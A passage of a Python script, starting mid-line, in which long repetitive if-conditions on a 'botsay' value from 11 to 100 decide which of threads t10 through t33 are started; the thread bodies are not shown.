botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t10.start()
if botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t11.start()
if botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t12.start()
if botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t13.start()
if botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t14.start()
if botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t15.start()
if botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t16.start()
if botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t17.start()
if botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t18.start()
if botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t19.start()
if botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t20.start()
if botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t21.start()
if botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t22.start()
if botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t23.start()
if botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t24.start()
if botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t25.start()
if botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t26.start()
if botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t27.start()
if botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t28.start()
if botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t29.start()
if botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t30.start()
if botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t31.start()
if botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t32.start()
if botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t33.start()
